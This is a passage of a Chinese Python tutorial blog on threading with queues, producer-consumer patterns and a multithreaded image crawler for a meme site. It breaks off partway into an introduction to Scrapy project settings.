python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> queue <span class=\"keyword\">import</span> Queue</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在队列中放入数值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_value</span>(<span class=\"params\">q</span>):</span></span><br><span class=\"line\">\tindex = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\tq.put(index)</span><br><span class=\"line\">\t\tindex += <span class=\"number\">1</span></span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取出队列中的数值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_value</span>(<span class=\"params\">q</span>):</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(q.get())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"comment\"># 产生一个队列</span></span><br><span class=\"line\">\tq = Queue(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tt1 = threading.Thread(target=set_value, args=[q])</span><br><span class=\"line\">\tt2 = threading.Thread(target=get_value, args=[q])</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1.start()</span><br><span class=\"line\">\tt2.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例三：(Queue版)</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> threading,time</span><br><span class=\"line\"><span class=\"comment\">#python2  from Queue import Queue</span></span><br><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> queue</span><br><span class=\"line\">\t\tcount = <span class=\"number\">0</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"comment\">#qsize返回queue内部长度</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> queue.qsize() &lt; <span class=\"number\">1000</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\t\t\t\t\tcount += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t\t\tmsg = <span class=\"string\">&#x27;生成产量&#x27;</span>+<span class=\"built_in\">str</span>(count)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">#put是往queue中放入</span></span><br><span class=\"line\">\t\t\t\t\tqueue.put(msg)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> queue</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> queue.qsize() &gt; <span class=\"number\">100</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">#get从queue中取出一个值</span></span><br><span class=\"line\">\t\t\t\t\tmsg = self.name + <span class=\"string\">&quot;消费了&quot;</span>+queue.get()</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">print</span>(msg)</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tqueue = queue.Queue()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):</span><br><span class=\"line\">\t\tqueue.put(<span class=\"string\">&quot;初始产品&quot;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">\t\tp = Producer()</span><br><span class=\"line\">\t\tp.start()</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tc = Consumer()</span><br><span class=\"line\">\t\tc.start()</span><br><span class=\"line\">\t\t</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"爬虫之多线程\"><a href=\"#爬虫之多线程\" class=\"headerlink\" title=\"爬虫之多线程\"></a>爬虫之多线程</h3><ul>\n<li>多线程爬虫框架代码</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> queue <span class=\"keyword\">import</span> Queue</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot; </span></span><br><span class=\"line\"><span class=\"string\">我们引入了threading这个包，我们将使用这个包中的</span></span><br><span class=\"line\"><span class=\"string\">Thread类，并在我们自定义的类中继承这个Thread类</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生产者线程</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Procuder</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\theaders = &#123;</span><br><span class=\"line\">\t\t\t<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;... 浏览器...&#x27;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 重写继承于父类的__init__方法 &quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收&quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>(Procuder, self).__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 重写继承于父类的run方法，改成我们想要的方法&quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 从存放每页的url的队列中逐一挑出一个url并传入parse_page中</span></span><br><span class=\"line\"><span class=\"string\">\t\t获取每页的url</span></span><br><span class=\"line\"><span class=\"string\">\t&quot;&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\turl = self.page_queue.get()</span><br><span class=\"line\">\t\t\tself.parse_page(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse_page</span>(<span class=\"params\">self, url</span>):</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;&quot;&quot; </span></span><br><span class=\"line\"><span class=\"string\">\t\t.......</span></span><br><span class=\"line\"><span class=\"string\">\t\t</span></span><br><span class=\"line\"><span class=\"string\">\t\t获取每页的响应数据，并从中提取出每张图片的</span></span><br><span class=\"line\"><span class=\"string\">\t\turl和name，并放入队列中</span></span><br><span class=\"line\"><span class=\"string\">\t\t&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 消费者线程</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>(Procuder, self).__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.img_queue.empty() <span class=\"keyword\">and</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t<span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t......</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;&quot;&quot; 设置页数和图片的url队列&quot;&quot;&quot;</span></span><br><span class=\"line\">\tpage_queue = Queue()</span><br><span class=\"line\">\timg_queue = Queue()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 将每页的url放到页数队列中</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">101</span>):</span><br><span class=\"line\">\t\turl = <span class=\"string\">&#x27;http://........ %d&#x27;</span> % x</span><br><span class=\"line\">\t\tpage_queue.put(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 设置5个生产者线程</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = Procuder(page_queue, img_queue)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 设置5个消费者线程</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = Consumer(page_queue, img_queue)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多线程爬虫实战代码</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> request</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生产图片的url和name</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProimgUrl</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, headers, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>().__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\">\t\tself.headers = headers</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\turl = self.page_queue.get()</span><br><span class=\"line\">\t\t\t\tself.parse_page(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse_page</span>(<span class=\"params\">self, url</span>):</span></span><br><span class=\"line\">\t\timg_get = requests.get(url=url, headers=self.headers).text</span><br><span class=\"line\">\t\ttree = etree.HTML(img_get)</span><br><span class=\"line\">\t\timg_it = tree.xpath(<span class=\"string\">&#x27;//div[@class=&quot;page-content text-center&quot;]//a&#x27;</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> img_it:</span><br><span class=\"line\">\t\t\timg_url = it.xpath(<span class=\"string\">&#x27;./img[@class!=&quot;gif&quot;]/@data-original&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">\t\t\talt = it.xpath(<span class=\"string\">&#x27;./img/@alt&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">\t\t\talt = re.sub(<span class=\"string\">r&#x27;[\\?？.!！，。\\/\\*]&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, alt)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 利用splitext截取图片的后缀名</span></span><br><span class=\"line\">\t\t\tsuffix = os.path.splitext(img_url)[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\t\timg_name = alt + suffix</span><br><span class=\"line\">\t\t\tself.img_queue.put((img_url, img_name))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取图片并储存</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ConimgName</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, page_queue, img_queue, headers, *args, **kwargs</span>):</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>().__init__(*args, **kwargs)</span><br><span class=\"line\">\t\tself.page_queue = page_queue</span><br><span class=\"line\">\t\tself.img_queue = img_queue</span><br><span class=\"line\">\t\tself.headers = headers</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> self.img_queue.empty() <span class=\"keyword\">and</span> self.page_queue.empty():</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\timg_url, img_name = self.img_queue.get()</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\"># 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片</span></span><br><span class=\"line\">\t\t\t\trequest.urlretrieve(img_url, <span class=\"string\">&#x27;./smile/&#x27;</span>+img_name)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(img_name + <span class=\"string\">&#x27; 下载成功...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./smile&#x27;</span>):</span><br><span class=\"line\">\t\tos.mkdir(<span class=\"string\">&#x27;./smile&#x27;</span>)</span><br><span class=\"line\">\theaders = &#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">\t\t\t\t\t  <span class=\"string\">&#x27;Chrome/80.0.3987.149 Safari/537.36 &#x27;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpage_queue = queue.Queue(<span class=\"number\">100</span>)</span><br><span class=\"line\">\timg_queue = queue.Queue(<span class=\"number\">1000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">\t\turl = <span class=\"string\">&#x27;https://www.doutula.com/photo/list/?page=&#x27;</span> + <span class=\"built_in\">str</span>(x)</span><br><span class=\"line\">\t\tpage_queue.put(url)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = ProimgUrl(page_queue, img_queue, headers)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = ConimgName(page_queue, img_queue, headers)</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的</li>\n</ul>\n<h1 id=\"爬虫第五天\"><a href=\"#爬虫第五天\" class=\"headerlink\" title=\"爬虫第五天\"></a>爬虫第五天</h1><h2 id=\"scrapy爬虫框架\"><a href=\"#scrapy爬虫框架\" class=\"headerlink\" title=\"scrapy爬虫框架\"></a>scrapy爬虫框架</h2><p><a href=\"https://zhuanlan.zhihu.com/p/25443389\">关于xpath选择器selector的网址</a></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200328091921480.png\" alt=\"scrapy框架示意图\"></p>\n<ol>\n<li><p>创建项目</p>\n<p>​    scrapy startproject #^%#^(项目名字)</p>\n</li>\n<li><p>创建爬虫</p>\n<p>​    scrapy genspider 爬虫名字 网络域名</p>\n<p>注意：</p>\n<ul>\n<li>爬虫名字不要和项目名字一样</li>\n<li>网站域名是允许爬虫采集的域名<ul>\n<li>baidu.com</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><img src=\"https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"创建项目与配置环境后各部分组件\"></p>\n<p>item文件是存储数据的</p>\n<ul>\n<li><p>在setting文件（程序启动被首先检查的文件）</p>\n</li>\n<li><p>BOT_NAME = 爬虫的名字</p>\n</li>\n<li><p>ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔</p>\n</li>\n<li><p>CONCURRENT_REQUESTS = 爬虫的并发量</p>\n</li>\n<li><p>DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管</p>\n</li>\n<li><p>COOKLES_ENABLED = cookiede的使用，布尔</p>\n</li>\n<li><p>DEFAULT_REQUEST_HEADERS = 默认请求头</p>\n</li>\n<li><p>ITEM_PIPELINES = 管道文件</p>\n<h3 id=\"setting文件详解\"><a href=\"#setting文件详解\" class=\"headerlink\" title=\"setting文件详解\"></a>setting文件详解</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 